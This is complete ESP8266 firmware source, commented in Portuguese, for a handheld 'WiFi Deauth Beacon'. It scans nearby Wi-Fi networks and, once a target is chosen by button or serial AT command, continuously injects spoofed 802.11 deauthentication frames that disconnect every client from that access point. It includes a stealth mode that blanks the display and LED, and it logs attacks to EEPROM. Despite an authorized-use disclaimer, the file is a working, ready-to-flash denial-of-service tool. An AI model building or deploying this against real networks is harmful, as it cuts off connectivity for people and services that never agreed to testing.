/*
 * ============================================================
 *  WiFi Deauth Beacon — Hardware Hacking
 * ============================================================
 *  Autor    : VolkSec
 *  Versão   : 1.0.0
 *  Data     : 01/03/2026
 *  Hardware : ESP8266 — Wemos D1 Mini v3
 *  Licença  : MIT (uso educacional e autorizado)
 * ============================================================
 *
 *  AVISO LEGAL:
 *  Esta ferramenta destina-se EXCLUSIVAMENTE a testes de
 *  penetração autorizados e fins educacionais. O uso em redes
 *  sem autorização expressa é ilegal e pode configurar crime
 *  conforme a Lei 12.737/2012 (Brasil) e legislações similares.
 *
 * ============================================================
 *  Bibliotecas necessárias (instalar via Library Manager):
 *  - Adafruit_SSD1306  >= 2.5.7
 *  - Adafruit_GFX      >= 1.11.5
 *
 *  Board: ESP8266 (via Board Manager URL):
 *  http://arduino.esp8266.com/stable/package_esp8266com_index.json
 *  Board name: LOLIN(WEMOS) D1 R2 & mini
 * ============================================================
 */

// ─── Includes ────────────────────────────────────────────────────────────────
#include <ESP8266WiFi.h>          // Stack Wi-Fi nativa do ESP8266
#include <Wire.h>                 // Protocolo I2C para o display OLED
#include <Adafruit_GFX.h>         // Biblioteca gráfica base (Adafruit)
#include <Adafruit_SSD1306.h>     // Driver do display SSD1306 128x64
#include <EEPROM.h>               // Leitura/escrita na memória EEPROM interna

// ─── SDK do ESP8266 para injeção de pacotes raw 802.11 ───────────────────────
extern "C" {
  #include "user_interface.h"
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// ─── Definições de Hardware ───────────────────────────────────────────────────
#define SCREEN_WIDTH   128        // Largura do display OLED em pixels
#define SCREEN_HEIGHT   64        // Altura do display OLED em pixels
#define OLED_RESET      -1        // Pino de reset (-1 = compartilha reset do Arduino)
#define OLED_ADDRESS  0x3C        // Endereço I2C padrão do SSD1306 (alt: 0x3D)

#define BTN_UP         14         // D5 — Botão navegar para cima
#define BTN_DOWN       12         // D6 — Botão navegar para baixo
#define BTN_SEL        13         // D7 — Botão selecionar / confirmar
#define LED_STATUS      2         // D4 — LED de status (active LOW no Wemos)

// ─── Constantes de configuração ───────────────────────────────────────────────
#define MAX_NETWORKS    20        // Número máximo de redes armazenadas no scan
#define MAX_TARGETS      8        // Número máximo de alvos simultâneos
#define EEPROM_SIZE    512        // Tamanho reservado para log (bytes)
#define SCAN_INTERVAL 10000       // Intervalo de re-scan automático (ms)
#define DEBOUNCE_MS    200        // Debounce para os botões físicos (ms)
#define FRAMES_PER_BURST 10       // Frames de deauth por iteração do loop
#define FRAME_DELAY_US  200       // Atraso entre frames (microsegundos)

// ─── Versão do firmware ───────────────────────────────────────────────────────
#define FW_VERSION "1.0.0"
#define DEVICE_NAME "WiFi Deauth Beacon"

// ─── Instância do display OLED ────────────────────────────────────────────────
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ─── Estrutura de dados de uma rede Wi-Fi detectada ──────────────────────────
struct Network {
  String  ssid;           // Nome da rede (SSID)
  uint8_t bssid[6];       // Endereço MAC do ponto de acesso
  int32_t rssi;           // Intensidade do sinal (dBm — mais próximo de 0 = mais forte)
  uint8_t channel;        // Canal Wi-Fi (1-13)
  uint8_t encType;        // Tipo de criptografia (ENC_TYPE_*)
};

// ─── Estrutura de entrada no log ─────────────────────────────────────────────
struct LogEntry {
  char    bssid[18];      // BSSID em formato string "AA:BB:CC:DD:EE:FF"
  uint8_t channel;        // Canal do alvo
  uint16_t frameCount;    // Frames enviados nesta sessão
  uint8_t  checksum;      // Checksum simples para validação
};

// ─── Variáveis de estado global ───────────────────────────────────────────────
Network  networks[MAX_NETWORKS];  // Buffer de redes detectadas
int      netCount      = 0;       // Total de redes encontradas
int      menuIndex     = 0;       // Posição atual no menu de navegação
int      targetIndex   = 0;       // Índice do alvo selecionado
bool     attacking     = false;   // Flag: ataque em andamento
bool     stealthMode   = false;   // Flag: modo stealth ativo
bool     broadcastMode = true;    // true=broadcast / false=unicast
uint32_t frameCount    = 0;       // Total de frames enviados na sessão atual
uint32_t lastScan      = 0;       // Timestamp do último scan (millis)
uint8_t  logOffset     = 0;       // Offset de escrita no log da EEPROM

// ─── Frame de Desautenticação 802.11 ─────────────────────────────────────────
/*
 *  Estrutura do Management Frame de Desautenticação (IEEE 802.11-2016, Sec. 9.3.3.1)
 *
 *  Bytes  0-1  : Frame Control  (0xC0 0x00) = Type:Management, Subtype:Deauthentication
 *  Bytes  2-3  : Duration       (0x00 0x00) = 0 microsegundos
 *  Bytes  4-9  : Destination    (endereço do cliente ou FF:FF:FF:FF:FF:FF para broadcast)
 *  Bytes 10-15 : Source         (BSSID do AP — spoofado)
 *  Bytes 16-21 : BSSID          (BSSID do AP)
 *  Bytes 22-23 : Sequence       (incrementado a cada frame)
 *  Bytes 24-25 : Reason Code    (0x07 = Class 3 frame received from nonassociated STA)
 */
uint8_t deauthFrame[26] = {
  0xC0, 0x00,                               // Frame Control: Deauthentication
  0x00, 0x00,                               // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // Destination: broadcast (substituído p/ unicast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // Source: BSSID do AP (preenchido em runtime)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // BSSID: BSSID do AP (preenchido em runtime)
  0x00, 0x00,                               // Sequence Number (incrementado)
  0x07, 0x00                                // Reason Code: 7 = Class 3 frame
};

// ═════════════════════════════════════════════════════════════════════════════
//  FUNÇÕES UTILITÁRIAS
// ═════════════════════════════════════════════════════════════════════════════

/*
 * bssidToStr()
 * Converte array de 6 bytes (MAC) para string no formato "AA:BB:CC:DD:EE:FF"
 */
String bssidToStr(const uint8_t* bssid) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(buf);
}

/*
 * encTypeToStr()
 * Retorna string descritiva do tipo de criptografia da rede
 */
String encTypeToStr(uint8_t enc) {
  switch (enc) {
    case ENC_TYPE_WEP:  return "WEP";
    case ENC_TYPE_TKIP: return "WPA";
    case ENC_TYPE_CCMP: return "WPA2";
    case ENC_TYPE_AUTO: return "AUTO";
    case ENC_TYPE_NONE: return "OPEN";
    default:            return "UNK";
  }
}

/*
 * blinkLed()
 * Pisca o LED de status N vezes com período definido
 */
void blinkLed(int times, int period_ms = 100) {
  if (stealthMode) return;
  for (int i = 0; i < times; i++) {
    digitalWrite(LED_STATUS, LOW);
    delay(period_ms);
    digitalWrite(LED_STATUS, HIGH);
    delay(period_ms);
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  EEPROM — LOG PERSISTENTE
// ═════════════════════════════════════════════════════════════════════════════

/*
 * logToEEPROM()
 * Salva entrada de log na EEPROM ao fim de cada sessão de ataque.
 * Formato circular: sobrescreve entradas antigas quando a EEPROM está cheia.
 */
void logToEEPROM() {
  if (netCount == 0 || frameCount == 0) return;

  LogEntry entry;
  strncpy(entry.bssid, bssidToStr(networks[targetIndex].bssid).c_str(), 17);
  entry.bssid[17] = '\0';
  entry.channel    = networks[targetIndex].channel;
  entry.frameCount = (frameCount > 0xFFFF) ? 0xFFFF : (uint16_t)frameCount;
  entry.checksum   = (entry.channel ^ entry.frameCount) & 0xFF;

  // Calcula offset circular (cada entry ocupa sizeof(LogEntry) bytes)
  uint8_t maxEntries = EEPROM_SIZE / sizeof(LogEntry);
  uint8_t writeAddr  = (logOffset % maxEntries) * sizeof(LogEntry);

  EEPROM.put(writeAddr, entry);
  EEPROM.commit();
  logOffset++;

  Serial.printf("[LOG] Entrada salva na EEPROM (offset=%d): %s CH:%d Frames:%d\n",
                writeAddr, entry.bssid, entry.channel, entry.frameCount);
}

/*
 * readLogFromEEPROM()
 * Lê e imprime todas as entradas de log válidas da EEPROM via Serial.
 */
void readLogFromEEPROM() {
  Serial.println("\n[LOG] === LOG DA EEPROM ===");
  uint8_t maxEntries = EEPROM_SIZE / sizeof(LogEntry);
  bool    found      = false;

  for (uint8_t i = 0; i < maxEntries; i++) {
    LogEntry entry;
    EEPROM.get(i * sizeof(LogEntry), entry);

    // Valida checksum e BSSID não-vazio
    uint8_t expected = (entry.channel ^ entry.frameCount) & 0xFF;
    if (entry.checksum == expected && entry.bssid[2] == ':') {
      Serial.printf("[%02d] BSSID: %s  CH:%02d  Frames:%d\n",
                    i, entry.bssid, entry.channel, entry.frameCount);
      found = true;
    }
  }
  if (!found) Serial.println("[LOG] Nenhuma entrada valida encontrada.");
  Serial.println("[LOG] === FIM DO LOG ===\n");
}

/*
 * clearEEPROM()
 * Zera toda a EEPROM (apaga log).
 */
void clearEEPROM() {
  for (int i = 0; i < EEPROM_SIZE; i++) EEPROM.write(i, 0xFF);
  EEPROM.commit();
  logOffset = 0;
  Serial.println("[LOG] EEPROM limpa com sucesso.");
}

// ═════════════════════════════════════════════════════════════════════════════
//  DISPLAY — INTERFACE OLED
// ═════════════════════════════════════════════════════════════════════════════

/*
 * showSplash()
 * Exibe tela inicial (splash screen) por 2 segundos no boot.
 */
void showSplash() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);

  // Linha decorativa
  display.drawFastHLine(0, 0, SCREEN_WIDTH, SSD1306_WHITE);
  display.drawFastHLine(0, 63, SCREEN_WIDTH, SSD1306_WHITE);
  display.drawFastVLine(0, 0, SCREEN_HEIGHT, SSD1306_WHITE);
  display.drawFastVLine(127, 0, SCREEN_HEIGHT, SSD1306_WHITE);

  display.setTextSize(1);
  display.setCursor(14, 8);
  display.print("WiFi Deauth Beacon");
  display.drawFastHLine(5, 18, 118, SSD1306_WHITE);

  display.setTextSize(2);
  display.setCursor(40, 22);
  display.print("v" FW_VERSION);

  display.setTextSize(1);
  display.setCursor(22, 42);
  display.print("Volk Hardware Hacking");
  display.setCursor(28, 52);
  display.print("Volk Sec 2026");

  display.display();
  delay(2500);
}

/*
 * updateDisplay()
 * Atualiza o display com o estado atual da aplicação.
 * Mostra: modo, SSID/BSSID alvo, canal, frames enviados e status.
 */
void updateDisplay() {
  if (stealthMode) return;  // Em stealth, display fica apagado

  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);

  // ── Header ──────────────────────────────────────────────────
  display.setCursor(0, 0);
  if (attacking) {
    display.print("[ATTACKING]");
  } else {
    display.print("[STANDBY]");
  }
  display.setCursor(90, 0);
  display.printf("CH:%02d", (netCount > 0) ? networks[targetIndex].channel : 0);
  display.drawFastHLine(0, 9, SCREEN_WIDTH, SSD1306_WHITE);

  // ── Lista de redes (scroll baseado no menuIndex) ─────────────
  int startIdx = max(0, menuIndex - 2);
  int y = 12;
  for (int i = startIdx; i < min(netCount, startIdx + 4); i++) {
    if (i == menuIndex) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    // Trunca SSID em 14 chars para caber no display
    String ssid = networks[i].ssid.substring(0, 14);
    display.setCursor(2, y);
    display.printf("%s %ddBm", ssid.c_str(), networks[i].rssi);
    y += 11;
    display.setTextColor(SSD1306_WHITE);
  }

  // ── Footer ───────────────────────────────────────────────────
  display.drawFastHLine(0, 54, SCREEN_WIDTH, SSD1306_WHITE);
  display.setCursor(0, 56);
  if (attacking) {
    display.printf("Frames: %lu", frameCount);
  } else {
    display.printf("Nets:%d  [SEL]=ATK", netCount);
  }

  display.display();
}

/*
 * showMessage()
 * Exibe mensagem temporária centralizada no display.
 */
void showMessage(const char* line1, const char* line2 = "", int duration_ms = 1500) {
  if (stealthMode) return;
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 10); display.println(line1);
  display.setCursor(0, 25); display.println(line2);
  display.display();
  if (duration_ms > 0) delay(duration_ms);
}

// ═════════════════════════════════════════════════════════════════════════════
//  WI-FI — SCAN E ATAQUE
// ═════════════════════════════════════════════════════════════════════════════

/*
 * scanNetworks()
 * Realiza varredura de redes Wi-Fi e ordena por RSSI (maior sinal primeiro).
 * Preenche o array global `networks[]` e atualiza `netCount`.
 */
void scanNetworks() {
  showMessage("Scanning...", "Aguarde...", 0);
  Serial.println("[SCN] Iniciando scan de redes...");

  // Desativa ataque durante scan
  bool wasAttacking = attacking;
  attacking = false;

  // Scan síncrono (bloqueante) — retorna número de redes encontradas
  int found = WiFi.scanNetworks(false, true); // includeHidden=true

  netCount = min(found, MAX_NETWORKS);

  // Copia dados para estrutura local e ordena por RSSI
  for (int i = 0; i < netCount; i++) {
    networks[i].ssid    = WiFi.SSID(i);
    networks[i].rssi    = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].encType = WiFi.encryptionType(i);
    WiFi.BSSID(i, networks[i].bssid);
  }

  // Bubble sort por RSSI decrescente (melhor sinal no topo)
  for (int i = 0; i < netCount - 1; i++) {
    for (int j = i + 1; j < netCount; j++) {
      if (networks[j].rssi > networks[i].rssi) {
        Network tmp  = networks[i];
        networks[i]  = networks[j];
        networks[j]  = tmp;
      }
    }
  }

  menuIndex   = 0;
  targetIndex = 0;
  lastScan    = millis();

  Serial.printf("[SCN] %d redes encontradas.\n", netCount);
  for (int i = 0; i < netCount; i++) {
    Serial.printf("[%02d] %-20s BSSID:%s CH:%02d RSSI:%4ddBm ENC:%s\n",
                  i,
                  networks[i].ssid.c_str(),
                  bssidToStr(networks[i].bssid).c_str(),
                  networks[i].channel,
                  networks[i].rssi,
                  encTypeToStr(networks[i].encType).c_str());
  }

  attacking = wasAttacking;
  updateDisplay();
  blinkLed(2, 50);
}

/*
 * sendDeauthFrames()
 * Envia `count` frames de desautenticação 802.11 para o alvo especificado.
 *
 * @param bssid    BSSID do ponto de acesso alvo
 * @param channel  Canal Wi-Fi do alvo
 * @param count    Número de frames a enviar por chamada
 * @param unicast  Se true, envia para endereço específico (não implementado nesta versão)
 */
void sendDeauthFrames(uint8_t* bssid, uint8_t channel, int count, bool unicast = false) {
  // Sintoniza no canal do alvo antes de transmitir
  wifi_set_channel(channel);

  // Preenche Source MAC (bytes 10-15) com o BSSID do AP (spoofing)
  memcpy(&deauthFrame[10], bssid, 6);
  // Preenche BSSID field (bytes 16-21)
  memcpy(&deauthFrame[16], bssid, 6);

  if (broadcastMode) {
    // Destino: FF:FF:FF:FF:FF:FF — desconecta TODOS os clientes
    memset(&deauthFrame[4], 0xFF, 6);
  }
  // Nota: modo unicast requer captura prévia do MAC do cliente (futuro)

  for (int i = 0; i < count; i++) {
    // Incrementa sequence number para evitar filtragem por deduplicação
    uint16_t seq = frameCount & 0x0FFF;
    deauthFrame[22] = (seq & 0xFF);
    deauthFrame[23] = ((seq >> 8) & 0x0F);

    // Envia frame raw via SDK do ESP8266 (função não-documentada)
    // Retorna 0 em sucesso, -1 em falha
    if (wifi_send_pkt_freedom(deauthFrame, sizeof(deauthFrame), 0) == 0) {
      frameCount++;
    }

    delayMicroseconds(FRAME_DELAY_US);

    // Pulsa o LED em modo não-stealth
    if (!stealthMode) {
      digitalWrite(LED_STATUS, (frameCount % 4 == 0) ? LOW : HIGH);
    }
  }

  // Atualiza display a cada burst (evita flickering excessivo)
  static uint32_t lastDisplayUpdate = 0;
  if (millis() - lastDisplayUpdate > 200) {
    updateDisplay();
    lastDisplayUpdate = millis();
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  BOTÕES — INTERFACE FÍSICA
// ═════════════════════════════════════════════════════════════════════════════

/*
 * handleButtons()
 * Lê o estado dos três botões físicos com debounce.
 * UP/DOWN navegam pelo menu, SELECT inicia/para o ataque.
 */
void handleButtons() {
  static uint32_t lastDebounce = 0;
  if (millis() - lastDebounce < DEBOUNCE_MS) return;

  bool up  = !digitalRead(BTN_UP);
  bool dn  = !digitalRead(BTN_DOWN);
  bool sel = !digitalRead(BTN_SEL);

  if (!up && !dn && !sel) return;  // Nenhum botão pressionado

  lastDebounce = millis();

  if (up && netCount > 0) {
    menuIndex = max(0, menuIndex - 1);
    updateDisplay();
    Serial.printf("[BTN] UP — Selecionando: %s\n", networks[menuIndex].ssid.c_str());

  } else if (dn && netCount > 0) {
    menuIndex = min(netCount - 1, menuIndex + 1);
    updateDisplay();
    Serial.printf("[BTN] DOWN — Selecionando: %s\n", networks[menuIndex].ssid.c_str());

  } else if (sel) {
    if (!attacking) {
      // Primeiro SELECT: inicia ataque
      if (netCount == 0) {
        showMessage("Sem redes!", "Execute scan primeiro.", 2000);
        return;
      }
      targetIndex = menuIndex;
      attacking   = true;
      frameCount  = 0;
      Serial.printf("[ATK] Iniciando ataque: %s (%s) CH:%d\n",
                    networks[targetIndex].ssid.c_str(),
                    bssidToStr(networks[targetIndex].bssid).c_str(),
                    networks[targetIndex].channel);
      blinkLed(3, 80);

    } else {
      // Segundo SELECT: para ataque e salva log
      attacking = false;
      digitalWrite(LED_STATUS, HIGH);  // LED off
      Serial.printf("[STP] Ataque encerrado. Total de frames: %lu\n", frameCount);
      logToEEPROM();
      showMessage("Ataque parado!", "Log salvo na EEPROM.", 1500);
      updateDisplay();
    }
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  SERIAL — INTERFACE AT COMMANDS
// ═════════════════════════════════════════════════════════════════════════════

/*
 * printHelp()
 * Imprime lista de comandos AT disponíveis via Serial.
 */
void printHelp() {
  Serial.println("\n╔══════════════════════════════════════════╗");
  Serial.println("║   WiFi Deauth Beacon — Comandos AT      ║");
  Serial.println("╠══════════════════════════════════════════╣");
  Serial.println("║  AT+HELP            Lista comandos       ║");
  Serial.println("║  AT+SCAN            Escaneia redes       ║");
  Serial.println("║  AT+LIST            Lista redes          ║");
  Serial.println("║  AT+TARGET=<idx>    Define alvo          ║");
  Serial.println("║  AT+ATTACK=B        Ataque broadcast     ║");
  Serial.println("║  AT+ATTACK=U        Ataque unicast       ║");
  Serial.println("║  AT+STOP            Para o ataque        ║");
  Serial.println("║  AT+STATUS          Status atual         ║");
  Serial.println("║  AT+STEALTH=ON      Ativa modo stealth   ║");
  Serial.println("║  AT+STEALTH=OFF     Desativa stealth     ║");
  Serial.println("║  AT+LOG             Exibe log EEPROM     ║");
  Serial.println("║  AT+LOGCLEAR        Limpa log EEPROM     ║");
  Serial.println("║  AT+CHANNEL=<1-13>  Força canal fixo     ║");
  Serial.println("║  AT+RESET           Reinicia dispositivo ║");
  Serial.println("╚══════════════════════════════════════════╝\n");
}

/*
 * handleSerial()
 * Processa comandos AT recebidos via interface Serial (115200 baud).
 * Permite controle remoto do dispositivo por Kali Linux, RPi, etc.
 */
void handleSerial() {
  if (!Serial.available()) return;

  String cmd = Serial.readStringUntil('\n');
  cmd.trim();
  cmd.toUpperCase();

  if (cmd.length() == 0) return;

  Serial.printf("[CMD] Recebido: %s\n", cmd.c_str());

  // ── Comandos sem parâmetro ───────────────────────────────────
  if (cmd == "AT+HELP") {
    printHelp();

  } else if (cmd == "AT+SCAN") {
    scanNetworks();

  } else if (cmd == "AT+LIST") {
    if (netCount == 0) {
      Serial.println("[LST] Nenhuma rede. Execute AT+SCAN primeiro.");
      return;
    }
    Serial.println("[LST] Redes disponíveis:");
    for (int i = 0; i < netCount; i++) {
      Serial.printf("  [%02d] %-20s  BSSID:%s  CH:%02d  RSSI:%4ddBm  ENC:%s%s\n",
                    i,
                    networks[i].ssid.c_str(),
                    bssidToStr(networks[i].bssid).c_str(),
                    networks[i].channel,
                    networks[i].rssi,
                    encTypeToStr(networks[i].encType).c_str(),
                    (i == targetIndex) ? "  <-- ALVO" : "");
    }

  } else if (cmd == "AT+STATUS") {
    Serial.println("[STS] === STATUS ===");
    Serial.printf("  Versao    : %s\n", FW_VERSION);
    Serial.printf("  Atacando  : %s\n", attacking ? "SIM" : "NAO");
    Serial.printf("  Stealth   : %s\n", stealthMode ? "ON" : "OFF");
    Serial.printf("  Modo      : %s\n", broadcastMode ? "BROADCAST" : "UNICAST");
    Serial.printf("  Frames    : %lu\n", frameCount);
    Serial.printf("  Redes     : %d\n", netCount);
    if (netCount > 0) {
      Serial.printf("  Alvo      : %s (%s) CH:%d\n",
                    networks[targetIndex].ssid.c_str(),
                    bssidToStr(networks[targetIndex].bssid).c_str(),
                    networks[targetIndex].channel);
    }
    Serial.println("[STS] ===============");

  } else if (cmd == "AT+STOP") {
    if (!attacking) {
      Serial.println("[STP] Nenhum ataque em andamento.");
    } else {
      attacking = false;
      digitalWrite(LED_STATUS, HIGH);
      Serial.printf("[STP] Ataque encerrado. Frames enviados: %lu\n", frameCount);
      logToEEPROM();
    }

  } else if (cmd == "AT+STEALTH=ON") {
    stealthMode = true;
    display.ssd1306_command(SSD1306_DISPLAYOFF);
    digitalWrite(LED_STATUS, HIGH);
    Serial.println("[STL] Modo stealth ATIVADO. Display e LED desabilitados.");

  } else if (cmd == "AT+STEALTH=OFF") {
    stealthMode = false;
    display.ssd1306_command(SSD1306_DISPLAYON);
    Serial.println("[STL] Modo stealth DESATIVADO.");
    updateDisplay();

  } else if (cmd == "AT+LOG") {
    readLogFromEEPROM();

  } else if (cmd == "AT+LOGCLEAR") {
    clearEEPROM();

  } else if (cmd == "AT+RESET") {
    Serial.println("[RST] Reiniciando...");
    delay(500);
    ESP.restart();

  } else if (cmd == "AT+ATTACK=B") {
    // ── Ataque broadcast ────────────────────────────────────────
    if (netCount == 0) {
      Serial.println("[ERR] Execute AT+SCAN antes de atacar.");
      return;
    }
    broadcastMode = true;
    attacking     = true;
    frameCount    = 0;
    Serial.printf("[ATK] Broadcast deauth iniciado -> %s (%s) CH:%d\n",
                  networks[targetIndex].ssid.c_str(),
                  bssidToStr(networks[targetIndex].bssid).c_str(),
                  networks[targetIndex].channel);

  } else if (cmd == "AT+ATTACK=U") {
    // ── Ataque unicast (requer BSSID de cliente) ─────────────────
    if (netCount == 0) {
      Serial.println("[ERR] Execute AT+SCAN antes de atacar.");
      return;
    }
    broadcastMode = false;
    attacking     = true;
    frameCount    = 0;
    Serial.printf("[ATK] Unicast deauth iniciado -> %s CH:%d\n",
                  networks[targetIndex].ssid.c_str(),
                  networks[targetIndex].channel);
    Serial.println("[ATK] NOTA: Modo unicast requer captura de cliente via sniffer externo.");

  } else if (cmd.startsWith("AT+TARGET=")) {
    // ── Define alvo por índice ───────────────────────────────────
    int idx = cmd.substring(10).toInt();
    if (idx < 0 || idx >= netCount) {
      Serial.printf("[ERR] Índice inválido. Use 0 a %d.\n", netCount - 1);
    } else {
      targetIndex = idx;
      Serial.printf("[TGT] Alvo definido: [%02d] %s (%s) CH:%d RSSI:%ddBm\n",
                    idx,
                    networks[idx].ssid.c_str(),
                    bssidToStr(networks[idx].bssid).c_str(),
                    networks[idx].channel,
                    networks[idx].rssi);
      updateDisplay();
    }

  } else if (cmd.startsWith("AT+CHANNEL=")) {
    // ── Força canal fixo ────────────────────────────────────────
    int ch = cmd.substring(11).toInt();
    if (ch < 1 || ch > 13) {
      Serial.println("[ERR] Canal deve ser entre 1 e 13.");
    } else {
      wifi_set_channel(ch);
      Serial.printf("[CHN] Canal fixado em %d.\n", ch);
    }

  } else {
    // ── Comando desconhecido ─────────────────────────────────────
    Serial.printf("[ERR] Comando desconhecido: %s  (Digite AT+HELP)\n", cmd.c_str());
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  SETUP
// ═════════════════════════════════════════════════════════════════════════════

void setup() {
  // ── Serial ──────────────────────────────────────────────────────
  Serial.begin(115200);
  delay(100);
  Serial.println("\n\n[BOOT] " DEVICE_NAME " v" FW_VERSION);
  Serial.println("[BOOT] VolkSec — Offensive Security");

  // ── EEPROM ──────────────────────────────────────────────────────
  EEPROM.begin(EEPROM_SIZE);

  // ── GPIO ────────────────────────────────────────────────────────
  pinMode(BTN_UP,     INPUT_PULLUP);
  pinMode(BTN_DOWN,   INPUT_PULLUP);
  pinMode(BTN_SEL,    INPUT_PULLUP);
  pinMode(LED_STATUS, OUTPUT);
  digitalWrite(LED_STATUS, HIGH);  // LED desligado (active LOW)

  // ── Display OLED (I2C: SDA=D2/GPIO4, SCL=D1/GPIO5) ─────────────
  Wire.begin(4, 5);
  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
    Serial.println("[ERR] Display SSD1306 nao encontrado! Verifique conexoes I2C.");
    // Continua sem display (operação apenas via serial)
  } else {
    Serial.println("[OK]  Display OLED inicializado.");
    display.setRotation(0);
    display.clearDisplay();
    showSplash();
  }

  // ── Wi-Fi em modo Station (sem AP) ──────────────────────────────
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  wifi_set_opmode(STATION_MODE);
  delay(300);
  Serial.println("[OK]  Wi-Fi configurado (modo station).");

  // ── Scan inicial ────────────────────────────────────────────────
  scanNetworks();

  Serial.println("[OK]  Sistema pronto. Digite AT+HELP para comandos.");
  Serial.println("[WARN] Use apenas em redes autorizadas!\n");
  blinkLed(5, 60);
}

// ═════════════════════════════════════════════════════════════════════════════
//  LOOP PRINCIPAL
// ═════════════════════════════════════════════════════════════════════════════

void loop() {
  // ── Processa comandos AT via Serial ─────────────────────────────
  handleSerial();

  // ── Processa entradas dos botões físicos ────────────────────────
  handleButtons();

  // ── Re-scan automático (apenas quando não está atacando) ────────
  if (!attacking && (millis() - lastScan > SCAN_INTERVAL)) {
    scanNetworks();
  }

  // ── Loop de ataque (burst contínuo) ─────────────────────────────
  if (attacking && netCount > 0) {
    Network& target = networks[targetIndex];
    sendDeauthFrames(target.bssid, target.channel, FRAMES_PER_BURST, !broadcastMode);
    delay(50);  // Pequena pausa para não travar o watchdog
  }

  // ── Watchdog: yield para evitar reset do ESP8266 ────────────────
  yield();
}
